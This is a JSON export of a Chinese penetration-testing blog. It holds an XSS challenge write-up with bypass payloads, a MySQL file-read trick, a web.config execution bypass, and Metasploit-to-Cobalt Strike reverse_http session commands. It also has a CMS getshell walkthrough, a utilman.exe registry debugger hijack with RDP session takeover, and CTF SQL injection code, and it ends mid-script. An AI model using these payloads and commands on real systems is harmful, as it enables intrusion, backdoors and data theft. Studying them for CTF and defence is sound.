{"meta":{"title":"X1r0z Blog","subtitle":"剑之所指, 心之所向","description":"剑之所指, 心之所向","author":"X1r0z","url":"https://exp10it.cn"},"pages":[{"title":"categories","date":"2018-08-02T01:33:36.420Z","updated":"2018-08-02T01:33:36.420Z","comments":true,"path":"categories/index.html","permalink":"https://exp10it.cn/categories/index.html","excerpt":"","text":""},{"title":"project","date":"2018-08-02T02:51:39.565Z","updated":"2018-08-02T02:51:39.565Z","comments":true,"path":"project/index.html","permalink":"https://exp10it.cn/project/index.html","excerpt":"","text":"detect-xss Dork MSFvenom-NG WebScan"},{"title":"Tags","date":"2018-08-02T01:33:36.420Z","updated":"2018-08-02T01:33:36.420Z","comments":true,"path":"tags/index.html","permalink":"https://exp10it.cn/tags/index.html","excerpt":"","text":""},{"title":"about","date":"2018-08-02T02:11:25.785Z","updated":"2018-08-02T02:11:25.785Z","comments":true,"path":"about/index.html","permalink":"https://exp10it.cn/about/index.html","excerpt":"","text":"信安菜鸟 半吊子程序员 Linux 党 可爱的女孩子 喜欢洛天依 梦想漫游十次内网"}],"posts":[{"title":"Hello World","slug":"hello-world","date":"2018-08-01T16:00:00.000Z","updated":"2018-08-02T03:07:57.309Z","comments":true,"path":"2018/08/02/hello-world/","link":"","permalink":"https://exp10it.cn/2018/08/02/hello-world/","excerpt":"","text":"Hello The World Hexo 新的开始","categories":[{"name":"helloworld","slug":"helloworld","permalink":"https://exp10it.cn/categories/helloworld/"}],"tags":[{"name":"helloworld","slug":"helloworld","permalink":"https://exp10it.cn/tags/helloworld/"}]},{"title":"XSS Challenges 笔记","slug":"xss-challenges","date":"2018-07-31T16:00:00.000Z","updated":"2018-08-02T03:06:09.549Z","comments":true,"path":"2018/08/01/xss-challenges/","link":"","permalink":"https://exp10it.cn/2018/08/01/xss-challenges/","excerpt":"xss-quiz.int21h.jp 最近在看余大的那本书, 干货满满, 就闲的蛋疼的去做了下这个 xss 挑战. 17关和18关的 Hint 为 This stage works on only old version IE, 然后我就跳过了. 19关的 Twitter DOM-XSS 按照网上的 payload 也没有复现成功, 不知道是不是浏览器的问题.","text":"xss-quiz.int21h.jp 最近在看余大的那本书, 干货满满, 就闲的蛋疼的去做了下这个 xss 挑战. 17关和18关的 Hint 为 This stage works on only old version IE, 然后我就跳过了. 19关的 Twitter DOM-XSS 按照网上的 payload 也没有复现成功, 不知道是不是浏览器的问题. Stage #1Hint: very simple... 没啥技术含量, 直接注入代码. &lt;svg/onload=alert(document.domain)&gt; Stage #2Hint: close the current tag and add SCRIPT tag... 输出是在 input 标签中的 value 里面, 先闭合掉再注入代码 这题也能用 onmouseover 提交, 注意引号 &quot;&gt;&lt;svg/onload=alert(document.domain)&gt; 1 onmouseover=&quot;alert(document.domain) Stage #3Hint: The input in text box is properly escaped. p1 被过滤了, 抓包更改下 p2 就行 &lt;svg/onload=alert(document.domain)&gt; Stage #4Hint: invisible input field 查看源代码, 有个 hackme 参数, 抓包更改即可 &lt;svg/onload=alert(document.domain)&gt; Stage #5Hint: length limited text box 跟 Stage #2 一样 审查元素更改 maxlength 或者抓包修改参数 &quot;&gt;&lt;svg/onload=alert(document.domain)&gt; 1 onmouseover=&quot;alert(document.domain) Stage #6Hint: event handler attributes 尖括号被过滤了, 那就用 onmouseover 还是要注意引号的闭合 &quot; onmouseover=&quot;alert(document.domain) Stage #7Hint: nearly the same... but a bit more tricky. 这题跟上一题差不多, 不过参数间用的不是双引号, 直接就是空格 1 onmouseover=alert(document.domain) Stage #8Hint: the &#39;javascript&#39; scheme. 提交后会生成 a 标签, href 为我们输入的参数 javascript 伪协议 javascript:alert(document.domain) Stage #9Hint: UTF-7 XSS 这道题考的是 IE 浏览器遗留的 UTF-7 问题. 当 response 响应头的 Content-Type 未指定 charset 或为错误的 charset 时, IE 浏览器将返回页面中的编码当做 UTF-7 字符串执行. 12345&lt;?phpheader(&apos;Content-Type: text/html;charset=sb&apos;);?&gt;+/v8 +ADw-script+AD4-alert(0)+ADw-/script+AD4- IE 访问的时候就会执行弹窗 以此类推, 题目实体化了尖括号, 引号等字符串, 那就能用 UTF-7 编码然后绕过后端的过滤. 查看源代码, 有个 charset 参数可控, 抓包的时候更改为 UTF-7 这里好像不能直接输入 document.domain, 只能用编码, 记得 urlencode 一下 +/v8 +ACI- onmouseover=alert(d+AG8AYw-u+AG0-en+AHQALg-d+AG8AbQBh-in)+AD4- Stage #10Hint: s/domain//g; 测试的时候发现 domain 被替换为空, 但只进行了一次替换 同样两种方法, on 事件和闭合标签 1&quot; onmouseover=&quot;alert(document.ddomainomain) &quot;&gt;&lt;svg/onload=alert(document.ddomainomain)&gt; Stage #11Hint: &quot;s/script/xscript/ig;&quot; and &quot;s/on[a-z]+=/onxxx=/ig;&quot; and &quot;s/style=/stxxx=/ig;&quot; script 和 on 事件都被过滤了, 不过还是能用 a 标签 本来想用 data 协议的, 后来发现并不能弹出 document.domain 的值 浏览器会很神奇的把 tab 去除 &lt;a href=&quot;j&amp;Tab;a&amp;Tab;v&amp;Tab;a&amp;Tab;s&amp;Tab;c&amp;Tab;r&amp;Tab;i&amp;Tab;p&amp;Tab;t:alert(document.domain)&quot;&gt;click&lt;/a&gt; Stage #12Hint: &quot;s/[\\x00-\\x20\\&lt;\\&gt;\\&quot;\\&#39;]//g;&quot; 题目几乎过滤了所有能进行闭合的字符 但源代码中的 value 是没有用引号括起来的, 只要找个功能类似于引号的字符就行 简单 fuzz 一下发现并没有什么可利用的字符, 后来又在 IE 测试了一遍, 反引号能够替代引号闭合字符串 1``onmouseover=alert(document.domain); Stage #13Hint: style attribute css 的 xss, 两种方法, 第二种只能在 IE 下执行 background:url(javascript:alert(document.domain)); x:expression(alert(document.domain)); Stage #14Hint: s/(url|script|eval|expression)/xxx/ig; 过滤了 url 和 expression, 能用 css 的注释绕过 background:ur/*xss*/l(javascript:alert(document.domain)); x:express/*xss*/ion(alert(document.domain)); Stage #15Hint: document.write(); 提交后发现尖括号等字符都被转义了, 查看源代码发现是调用 document.write() 进行输出 注意这里是 JavaScript 的执行环境, 那就可以利用 JavaScript 的自解码机制去绕过 用 &amp;#x; 和 &amp;#; 好像并不能执行, 换成了反斜杠, 但这里直接输入反斜杠会变成空, 改成 // 就行了 \\\\x3cscript\\\\x3ealert(document.domain);\\\\x3c/script\\\\x3e Stage #16Hint: &quot;document.write();&quot; and &quot;s/\\\\x/\\\\\\\\x/ig;&quot; 这里用上一题的 payload 并不能成功执行 编码成 unicode 即可绕过, 反斜杠同样要输入两次 \\\\u003cscript\\\\u003ealert(document.domain)\\\\u003c\\\\u002fscript\\\\u003e Stage #17 Stage #18这两题没做, 直接贴上余大的 payload 吧 Hint: multi-byte character 123456euc-jp 的编码范围:byte 1 为 8E 时, 为 2 byte 编码, byte 2 范围为 A1-DFbyte 1 范围为 A1-FE 时, 为 2 byte编码, byte 2 范围为A1-FEbyte 1 为 8F 时为 3 byte编码, byte 2与 byte 3 范围均为 A1-FE两个表单元素都提交 %A7 闭合最后的双引号, 查看源码成功了, 为什么 UI 上去没成功? 无奈直接在地址栏: javascript:alert(document.domain);现在发现原来是浏览器版本问题，别用 IE8 了过这个. p1=1%A7&amp;p2=+onmouseover%3Dalert%28document.domain%29%3B+%A7 Hint: us-ascii high bit issue 1241-5A, 61-7A (若含数字与符号, 则为 21-7E)同样别用 IE8, 这些漏洞已经在 IE8 中修补了. p1=%A2%BE%BCscript%BEalert(document.domain);%BC/script%BE Stage #19Hint: Twitter DOM-XSS payload #!javascript&amp;#58;alert(document.domain); 复现失败","categories":[{"name":"ctf","slug":"ctf","permalink":"https://exp10it.cn/categories/ctf/"}],"tags":[{"name":"bypass","slug":"bypass","permalink":"https://exp10it.cn/tags/bypass/"},{"name":"writeup","slug":"writeup","permalink":"https://exp10it.cn/tags/writeup/"},{"name":"xss","slug":"xss","permalink":"https://exp10it.cn/tags/xss/"}]},{"title":"xor encrypt","slug":"xor-encrypt","date":"2018-07-29T16:00:00.000Z","updated":"2018-08-02T03:06:05.757Z","comments":true,"path":"2018/07/30/xor-encrypt/","link":"","permalink":"https://exp10it.cn/2018/07/30/xor-encrypt/","excerpt":"xor 异或运算表示 两个操作数的位中, 相同则为0, 不同则为1. xor 的运算符一般为 ^ 或者 XOR, 例如 110^011 表示对 110 和 011 两个二进制数进行异或运算. 123111^101 010110^110 000101^010 111","text":"xor 异或运算表示 两个操作数的位中, 相同则为0, 不同则为1. xor 的运算符一般为 ^ 或者 XOR, 例如 110^011 表示对 110 和 011 两个二进制数进行异或运算. 123111^101 010110^110 000101^010 111 xor 有个很神奇的特点, 对于两个二进制数 a b, 如果 a^b = c, 那必有 c^b = a. 123010^101 111000^110 110111^010 101 基于这种特性, 就衍生出了 xor 加密. message XOR key //cipher cipher XOR key //message 注意在加解密前后, key 的长度必须大于等于 message 或者 cipher 的长度. python 的 xor 加密实现 123456message = &apos;Hello World&apos;key = &apos;exp10itexp10itexp10it&apos;cipher = &apos;&apos;for i,j in zip(message,key): cipher += chr(ord(i)^ord(j)) cipherL &#39;-\\x1d\\x1c]_I#\\n\\n\\x1cU&#39; 解密同理 123456cipher = &apos;-\\x1d\\x1c]_I#\\n\\n\\x1cU&apos;key = &apos;exp10itexp10itexp10it&apos;message = &apos;&apos;for i,j in zip(cipher,key): message += chr(ord(i)^ord(j)) message: Hello World","categories":[{"name":"ctf","slug":"ctf","permalink":"https://exp10it.cn/categories/ctf/"}],"tags":[{"name":"note","slug":"note","permalink":"https://exp10it.cn/tags/note/"},{"name":"misc","slug":"misc","permalink":"https://exp10it.cn/tags/misc/"}]},{"title":"mysql load data local","slug":"mysql-load-data-local","date":"2018-07-21T16:00:00.000Z","updated":"2018-08-02T03:06:01.869Z","comments":true,"path":"2018/07/22/mysql-load-data-local/","link":"","permalink":"https://exp10it.cn/2018/07/22/mysql-load-data-local/","excerpt":"","text":"当 LOAD DATA INFILE 指定 LOCAL 时, 用户无需 FILE 权限, 文件将由客户端读取, 并把数据发送至服务器上. 以当前执行命令用户的权限读取文件. 例如从 phpmyadmin 中执行语句, 用户权限就为 web 容器的权限. 123create table `localfile` ( `content` LONGTEXT );LOAD DATA LOCAL INFILE &apos;C:/WWWROOT/index.php&apos; INTO TABLE `localfile` fields terminated by &apos;&apos;;select `content` from `localfile`; 如果显示不全或者其它奇怪的原因就在语句后面加上 LINES TERMINATED BY &#39;\\0&#39;.","categories":[{"name":"note","slug":"note","permalink":"https://exp10it.cn/categories/note/"}],"tags":[{"name":"mysql","slug":"mysql","permalink":"https://exp10it.cn/tags/mysql/"},{"name":"note","slug":"note","permalink":"https://exp10it.cn/tags/note/"}]},{"title":"web.config 突破权限限制","slug":"web-config-execute","date":"2018-07-18T16:00:00.000Z","updated":"2018-08-02T03:05:58.349Z","comments":true,"path":"2018/07/19/web-config-execute/","link":"","permalink":"https://exp10it.cn/2018/07/19/web-config-execute/","excerpt":"","text":"在一个可读写的目录里无法执行脚本, 通过上传特殊的 web.config 文件突破限制. 123456&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;configuration&gt; &lt;system.webServer&gt; &lt;handlers accessPolicy=&quot;Read, Write, Execute, Script&quot; /&gt; &lt;/system.webServer&gt;&lt;/configuration&gt;","categories":[{"name":"note","slug":"note","permalink":"https://exp10it.cn/categories/note/"}],"tags":[{"name":"webconfig","slug":"webconfig","permalink":"https://exp10it.cn/tags/webconfig/"}]},{"title":"msf 派生 cobalt strike 会话","slug":"msf-spawn-cobalt-strike","date":"2018-07-17T16:00:00.000Z","updated":"2018-08-02T03:05:55.565Z","comments":true,"path":"2018/07/18/msf-spawn-cobalt-strike/","link":"","permalink":"https://exp10it.cn/2018/07/18/msf-spawn-cobalt-strike/","excerpt":"","text":"12metasploit IP:192.168.1.100 PORT:4444Cobalt Strike IP:192.168.1.101 PORT:5555 有 meterpreter 会话利用 payload_inject 模块注入新的 payload. 1234567use exploit/windows/local/payload_injectset payload windows/meterpreter/reverse_httpset lhost 192.168.1.101set lport 5555set session 1set disablepayloadhandler truerun 无 meterpreter 会话在监听时将 LHOST 和 LPORT 改成 Cobalt Strike 对应的 IP 和 PORT. 123456use exploit/multi/handlerset payload windows/meterpreter/reverse_httpset lhost 192.168.1.101set lport 5555set disablepayloadhandler true run","categories":[{"name":"note","slug":"note","permalink":"https://exp10it.cn/categories/note/"}],"tags":[{"name":"metasploit","slug":"metasploit","permalink":"https://exp10it.cn/tags/metasploit/"},{"name":"cs","slug":"cs","permalink":"https://exp10it.cn/tags/cs/"}]},{"title":"powereasy 后台 getshell","slug":"powereasy-getshell","date":"2018-07-11T16:00:00.000Z","updated":"2018-08-02T03:05:52.597Z","comments":true,"path":"2018/07/12/powereasy-getshell/","link":"","permalink":"https://exp10it.cn/2018/07/12/powereasy-getshell/","excerpt":"","text":"系统设置 - 网站频道管理 - 下载中心 - 频道类型 将 上传文件的保存目录 改成 test.asp 最后左栏找到对应的频道直接上传, 抓包的路径不全, 还需要手动拼接下. 下载中心的目录为 /Soft/ 其它频道的目录在 频道类型 - 频道目录 里.","categories":[{"name":"cms-vul","slug":"cms-vul","permalink":"https://exp10it.cn/categories/cms-vul/"}],"tags":[{"name":"getshell","slug":"getshell","permalink":"https://exp10it.cn/tags/getshell/"},{"name":"powereasy","slug":"powereasy","permalink":"https://exp10it.cn/tags/powereasy/"}]},{"title":"mstsc tscon","slug":"mstsc-tscon","date":"2018-07-10T16:00:00.000Z","updated":"2018-08-02T03:05:49.557Z","comments":true,"path":"2018/07/11/mstsc-tscon/","link":"","permalink":"https://exp10it.cn/2018/07/11/mstsc-tscon/","excerpt":"","text":"渗透技巧 - 利用 tscon 实现未授权登录远程桌面 System 权限 nt authority\\system 放大镜 注册表劫持 1REG ADD &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe&quot; /t REG_SZ /v Debugger /d &quot;C:\\windows\\system32\\cmd.exe&quot; /f query user 查看 ID 12USERNAME SESSIONNAME ID STATE IDLE TIME LOGON TIMEadministrator rdp-tcp#1 1 Disc none 6/30/2018 10:00 输入命令 tcson 1 注意关闭远程桌面的时候不要点注销, 而是直接点右上角的X, 这样下次连接的时候还能进行切换.","categories":[{"name":"note","slug":"note","permalink":"https://exp10it.cn/categories/note/"}],"tags":[{"name":"domain","slug":"domain","permalink":"https://exp10it.cn/tags/domain/"}]},{"title":"common ports","slug":"common-ports","date":"2018-07-07T16:00:00.000Z","updated":"2018-08-02T03:05:44.153Z","comments":true,"path":"2018/07/08/common-ports/","link":"","permalink":"https://exp10it.cn/2018/07/08/common-ports/","excerpt":"","text":"由于 nmap 扫描网段开放端口 (TOP 1000) 的速度并不怎么理想 (可能是我姿势不对?), 就整理了一份常用的80多个端口. 包括但不限于 ftp ssh telnet ,各种 database application-server 和 web-server. 1(21, 22, 23, 25, 53, 80, 81, 82, 88, 89, 110, 135, 139, 389, 443, 445, 873, 1080, 1433, 1521, 1723, 2049, 2082, 2083, 3128, 3306, 3311, 3312, 3389, 3390, 3690, 3780, 4440, 4848, 4899, 5432, 5631, 5900, 5901, 5902, 5984, 6082, 6379, 7000, 7001, 7002, 7778, 8000, 8001, 8002, 8008, 8011, 8080, 8081, 8082, 8088, 8089, 8090, 8091, 8099, 8180, 8181, 8182, 8649, 8834, 8888, 8899, 9000, 9080, 9081, 9082, 9090, 9091, 9200, 9300, 10050, 11211, 27017, 27018, 28017, 50000, 50030, 50060, 50070)","categories":[{"name":"note","slug":"note","permalink":"https://exp10it.cn/categories/note/"}],"tags":[{"name":"security","slug":"security","permalink":"https://exp10it.cn/tags/security/"}]},{"title":"dork everything","slug":"dork-everything","date":"2018-07-06T16:00:00.000Z","updated":"2018-08-02T03:05:40.733Z","comments":true,"path":"2018/07/07/dork-everything/","link":"","permalink":"https://exp10it.cn/2018/07/07/dork-everything/","excerpt":"dork 是一款 Web 目录爆破工具. 123456 ___ ____ __H__| \\ ___ ___|.|__ &#123;1.4#stable&#125;| | | . | _|.|_/|____/|___|_| |.|_\\ V exp10it.cn dork feature支持 GET/POST/HEAD 三种请求方式 自定义 Cookie, Referer, 404 keyword 根据域名组合字典 (备份) 随机 IP, User-Agent 延时时间 (bypass) Timeout","text":"dork 是一款 Web 目录爆破工具. 123456 ___ ____ __H__| \\ ___ ___|.|__ &#123;1.4#stable&#125;| | | . | _|.|_/|____/|___|_| |.|_\\ V exp10it.cn dork feature支持 GET/POST/HEAD 三种请求方式 自定义 Cookie, Referer, 404 keyword 根据域名组合字典 (备份) 随机 IP, User-Agent 延时时间 (bypass) Timeout usage123456789101112131415161718usage: dork.py [-h] -u &lt;URL&gt; [-m HEAD GET POST] -f &lt;PATH&gt; [-t THREADS] [-k keyword] [-c cookie] [-r referer] [-d second] [--timeout second] [--social] [--random-agent] [--random-ip]optional arguments: -h, --help show this help message and exit -u &lt;URL&gt; Target URL -m HEAD GET POST Use method -f &lt;PATH&gt; Dictionary file -t THREADS Threads number -k keyword Not Found keyword -c cookie Custom Cookie -r referer Custom Referer --delay second Delay Time --timeout second Request Timeout --random-agent Use Random User-Agent --random-ip Use Random IP --social Use Social Engineering Mode Example12345./dork.py -u www.test.com -f dict/DIR.txt./dork.py -u url.txt -f dict/DIR.txt -t 5./dork.py -u www.test.com -m GET -k &apos;404&apos; -f dict/DIR.txt./dork.py -u www.test.com -m POST -t 1 --delay 1 --random-agent --random-ip --social -f dict/DIR.txt./dork.py -u www.test.com -m HEAD -c &apos;isLogin=1&apos; -r &apos;https://www.google.com/&apos; --timeout 1 -f dict/DIR.txt Other程序代码开头定义了默认的 user-agent, ip, cookie, referer, prefix, code 123456user_agent = &apos;Dork v1.4#stable (https://github.com/X1r0z/dork)&apos;user_ip = &apos;127.0.0.1&apos;cookie = &apos;hello=world&apos;referer = &apos;https://www.baidu.com/&apos;prefix = &apos;http://&apos;code = [200, 301, 302, 403, 500] 程序默认支持 -u www.test.com 和 -u http://www.test.com 两种方式. 如果使用第一种方式, 则 url 为 http://www.test.com (prefix + url) 建议扫描 https 站点时使用第二种方式, 或更改 prefixc","categories":[{"name":"tools","slug":"tools","permalink":"https://exp10it.cn/categories/tools/"}],"tags":[{"name":"python","slug":"python","permalink":"https://exp10it.cn/tags/python/"}]},{"title":"burpsuite attack type","slug":"brupsuite-attack-type","date":"2018-07-05T16:00:00.000Z","updated":"2018-08-02T03:05:37.621Z","comments":true,"path":"2018/07/06/brupsuite-attack-type/","link":"","permalink":"https://exp10it.cn/2018/07/06/brupsuite-attack-type/","excerpt":"BurpSuite Intruder 支持4种攻击模式. Sniper 狙击手, Battering ram 攻城锤, Pitchfork 干草叉 和 Cluster bomb 集束炸弹.","text":"BurpSuite Intruder 支持4种攻击模式. Sniper 狙击手, Battering ram 攻城锤, Pitchfork 干草叉 和 Cluster bomb 集束炸弹. Sniper狙击手将 payload 依次替换至每一个 position. 没有替换的 position 将用标注时默认的内容替代. 仅支持设置1个载荷集合. 123username=§1§&amp;password=§2§payload1: admin test guest result 1234567admin 2test 2guest 21 admin1 test1 guest Battering ram攻城锤将 payload 依次替换至所有的 position. 即每次发包时 position 里的 payload 都是相同的. 仅支持设置1个载荷集合. 123username=§1§&amp;password=§2§payload1: admin test guest result 123admin admintest testguest guest Pitchfork干草叉将不同载荷集合中的 payload 按顺序替换至对应的 position. 有多少 position 就设置多少载荷集合. 最多支持5个 position (载荷集合). 1234username=§1§&amp;password=§2§payload1: admin test guestpayload2: 123 456 789 result 123admin 123test 456guest 789 Cluster bomb集束炸弹将不同载荷集合中的 payload 依次替换至每一个 position. 有多少 position 就设置多少载荷集合. 发包的数量为所有载荷集合中 payload 的乘积. 1234username=§1§&amp;password=§2§payload1: admin test guestpayload2: 123 456 789 result 1234567891011admin 123admin 456admin 789test 123test 456test 789guest 123guest 456guest 789","categories":[{"name":"note","slug":"note","permalink":"https://exp10it.cn/categories/note/"}],"tags":[{"name":"burp","slug":"burp","permalink":"https://exp10it.cn/tags/burp/"}]},{"title":"命令行语法格式","slug":"options-doc","date":"2018-07-04T16:00:00.000Z","updated":"2018-08-02T03:05:34.477Z","comments":true,"path":"2018/07/05/options-doc/","link":"","permalink":"https://exp10it.cn/2018/07/05/options-doc/","excerpt":"","text":"之前写轮子的时候看到的, 比较有意思, 就记下来了. 命令 &lt;必选参数1|必选参数2&gt; [-option {必选参数1|必选参数2|必选参数3} [可选参数...]] {(默认参数)|参数1|参数2} 123456&lt;&gt; 必选参数[] 可选参数&#123;&#125; 必选参数 多选一| 分隔多个互斥参数 多选一() 参数默认值 只用于 &#123;&#125; 中... 可为属性指定多个值","categories":[{"name":"note","slug":"note","permalink":"https://exp10it.cn/categories/note/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://exp10it.cn/tags/linux/"}]},{"title":"dede 前台通杀上传 0day","slug":"dede-upload-0day","date":"2018-06-27T16:00:00.000Z","updated":"2018-08-02T03:05:31.029Z","comments":true,"path":"2018/06/28/dede-upload-0day/","link":"","permalink":"https://exp10it.cn/2018/06/28/dede-upload-0day/","excerpt":"20180109 最新版本测试成功. 不过有三个限制 123451.开启会员中心2.允许发表文章3.select_images_post dede_upload_0day.doc","text":"20180109 最新版本测试成功. 不过有三个限制 123451.开启会员中心2.允许发表文章3.select_images_post dede_upload_0day.doc 想了想还是不公开吧, 毕竟你们用心点就会发现的.","categories":[{"name":"cms-vul","slug":"cms-vul","permalink":"https://exp10it.cn/categories/cms-vul/"}],"tags":[{"name":"exploit","slug":"exploit","permalink":"https://exp10it.cn/tags/exploit/"},{"name":"dede","slug":"dede","permalink":"https://exp10it.cn/tags/dede/"},{"name":"0day","slug":"0day","permalink":"https://exp10it.cn/tags/0day/"}]},{"title":"python asyncio","slug":"python-asyncio","date":"2018-06-25T16:00:00.000Z","updated":"2018-08-02T03:05:24.029Z","comments":true,"path":"2018/06/26/python-asyncio/","link":"","permalink":"https://exp10it.cn/2018/06/26/python-asyncio/","excerpt":"asyncio 是在 Python 3.4 中引入的异步 IO 标准库. 简单介绍一下什么是同步 IO / 异步 IO. 12同步 IO: 你去约女朋友啪啪啪, 你需要一直等着她来, 之后你才能和她♂.异步 IO: 你去约女朋友啪啪啪, 在她来的路上你不用一直等着, 可以去买套套什么的.","text":"asyncio 是在 Python 3.4 中引入的异步 IO 标准库. 简单介绍一下什么是同步 IO / 异步 IO. 12同步 IO: 你去约女朋友啪啪啪, 你需要一直等着她来, 之后你才能和她♂.异步 IO: 你去约女朋友啪啪啪, 在她来的路上你不用一直等着, 可以去买套套什么的. async/await/futurePython 3.5 引出的语法糖 async 创建协程, await 当协程阻塞时将其挂起并让步操作给其它协程, future 包装协程. 通过 asyncio.sleep() 模拟 IO 操作. 123456789101112131415161718import asyncioasync def hello(s): print(&apos;Waiting &apos;+str(s)) await asyncio.sleep(s) print(&apos;Done &apos;+str(s)) return &apos;Res &apos;+str(s)tasks = [ asyncio.ensure_future(hello(1)), asyncio.ensure_future(hello(2)), asyncio.ensure_future(hello(3))]loop = asyncio.get_event_loop()loop.run_until_complete(asyncio.wait(tasks))for task in tasks: print(task.result()) 输出 123456789Waiting 1Waiting 2Waiting 3Done 1Done 2Done 3Res 1Res 2Res 3 callback当协程执行完毕时调用 callback 123456789101112import asyncioasync def hello(): print(&apos;Hello World&apos;)def callback(future): print(&apos;Done&apos;)coro = asyncio.ensure_future(hello())coro.add_done_callback(callback)loop = asyncio.get_event_loop()loop.run_until_complete(coro) 输出 12Hello WorldDone aiohttpaiohttp 是基于 asyncio 的 HTTP 框架. aiohttp.request 用于发起 HTTP 请求. 123456789101112131415161718import asyncioimport aiohttpasync def req(s): print(&apos;Requesting &apos;+str(s)) async with aiohttp.request(&apos;GET&apos;,s) as response: res = await response.read() print(&apos;Receiving from &apos;+str(s))urls = [&apos;http://www.baidu.com/&apos;,&apos;http://www.qq.com&apos;,&apos;http://www.163.com/&apos;]tasks = []for url in urls: coro = asyncio.ensure_future(req(url)) tasks.append(coro)loop = asyncio.get_event_loop()loop.run_until_complete(asyncio.wait(tasks)) 输出 123456Requesting http://www.baidu.com/Requesting http://www.qq.comRequesting http://www.163.com/Receiving from http://www.baidu.com/Receiving from http://www.qq.comReceiving from http://www.163.com/ aiohttp.ClientSession 同样也能发起 HTTP 请求. 12345678910111213141516171819import asyncioimport aiohttpasync def req(s): print(&apos;Requesting &apos;+str(s)) async with aiohttp.ClientSession() as session: async with session.get(s) as response: res = await response.read() print(&apos;Receiving from &apos;+str(s))urls = [&apos;http://www.baidu.com/&apos;,&apos;http://www.qq.com&apos;,&apos;http://www.163.com/&apos;]tasks = []for url in urls: coro = asyncio.ensure_future(req(url)) tasks.append(coro)loop = asyncio.get_event_loop()loop.run_until_complete(asyncio.wait(tasks)) 输出 123456Requesting http://www.baidu.com/Requesting http://www.qq.comRequesting http://www.163.com/Receiving from http://www.baidu.com/Receiving from http://www.qq.comReceiving from http://www.163.com/","categories":[{"name":"note","slug":"note","permalink":"https://exp10it.cn/categories/note/"}],"tags":[{"name":"note","slug":"note","permalink":"https://exp10it.cn/tags/note/"},{"name":"python","slug":"python","permalink":"https://exp10it.cn/tags/python/"}]},{"title":"MSFvenom-NG","slug":"msfvenom-ng","date":"2018-06-22T16:00:00.000Z","updated":"2018-08-02T03:05:21.021Z","comments":true,"path":"2018/06/23/msfvenom-ng/","link":"","permalink":"https://exp10it.cn/2018/06/23/msfvenom-ng/","excerpt":"","text":"12345 ___ _____ ___| _|_ _ ___ ___ ___ _____| |_ -| _| | | -_| | . | ||_|_|_|___|_| \\_/|___|_|_|___|_|_|_| MSFvenom-NG 这应该会是我持续更新的一个项目. 123MSFvenom-NG 是一款交互式 Windows (EXE/DLL Powershell) 后门生成工具支持自定义编码规则 Bypass 杀毒软件 MSFvenom-NG","categories":[{"name":"tools","slug":"tools","permalink":"https://exp10it.cn/categories/tools/"}],"tags":[{"name":"python","slug":"python","permalink":"https://exp10it.cn/tags/python/"},{"name":"metasploit","slug":"metasploit","permalink":"https://exp10it.cn/tags/metasploit/"}]},{"title":"ChaBug Upload WriteUp","slug":"chabug-upload-writeup","date":"2018-06-21T16:00:00.000Z","updated":"2018-08-02T03:06:31.261Z","comments":true,"path":"2018/06/22/chabug-upload-writeup/","link":"","permalink":"https://exp10it.cn/2018/06/22/chabug-upload-writeup/","excerpt":"假上传点, 其实就是个简单的 SQLi. filename 时间盲注, 能用 BurpSuite 跑. 无提示地过滤了 and or union 关键字, 用 &amp;&amp; || 绕过. ctf.tar.gz","text":"假上传点, 其实就是个简单的 SQLi. filename 时间盲注, 能用 BurpSuite 跑. 无提示地过滤了 and or union 关键字, 用 &amp;&amp; || 绕过. ctf.tar.gz 源码 index.php 123456789101112131415161718&lt;form action=&quot;upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;&lt;input type=&quot;hidden&quot; name=&quot;filepath&quot; value=&quot;upload/&quot; /&gt;&lt;input type=&quot;hidden&quot; name=&quot;filename&quot; value=&quot;&lt;?php echo time().&apos;.jpg&apos;;?&gt;&quot; /&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;上传&quot; /&gt;&lt;/form&gt;&lt;?php$dir = opendir(&apos;upload/&apos;);while(($filename=readdir($dir))!==false)&#123; if(($filename !=&apos;.&apos;) &amp;&amp; ($filename!=&apos;..&apos;))&#123; echo $filename.&apos; &apos;; &#125;&#125;closedir($dir);?&gt; upload.php 12345678910111213141516171819202122232425262728&lt;?phpfunction waf($str)&#123; $keyword = array(&apos;union&apos;,&apos;insert&apos;,&apos;update&apos;,&apos;delete&apos;,&apos;where&apos;,&apos;and&apos;,&apos;or&apos;); foreach($keyword as $v)&#123; while(stripos($str,$v)!==false)&#123; $str = str_ireplace($v,&apos;&apos;,$str); &#125; &#125; return $str;&#125;if(isset($_POST[&apos;submit&apos;]))&#123; $filename = time().&apos;.jpg&apos;; move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;],&apos;upload/&apos;.$filename); echo &apos;File saved successfully!&apos;; echo &apos;&lt;br /&gt;&apos;; echo &apos;upload/&apos;.$filename; echo &apos;&lt;br /&gt;&apos;; $conn = mysqli_connect(&apos;localhost&apos;,&apos;root&apos;,&apos;root&apos;,&apos;ctf&apos;); $name = waf($_POST[&apos;filename&apos;]); $sql = &quot;INSERT INTO logs VALUES(&apos;$name&apos;)&quot;; $res = mysqli_query($conn,$sql) or die(&apos;saving information error&apos;); echo &apos;saved information successfully&apos;;&#125;?&gt; 搅屎脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104import os,sysimport timestr0 = &apos;&apos;&apos;&lt;?phpif(isset($_POST[&apos;a&apos;]))&#123; echo &apos;hint: union insert update delete where and or&apos;;&#125;&apos;&apos;&apos;str1 = &apos;&apos;&apos;&lt;html&gt;&lt;body&gt;&lt;center&gt;&lt;form method=&quot;POST&quot;&gt;&lt;input type=&quot;password&quot; name=&quot;getpwd&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot; O K &quot;&gt;&lt;/form&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;&apos;&apos;&apos;str2 = &apos;&apos;&apos;&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html&quot;&gt;&lt;title&gt;AUTHENTICATION REQUIRED&lt;/title&gt;&lt;style type=&quot;text/css&quot;&gt;body, table, tr, td, div, select, input, textarea, pre, code &#123; font: 100% 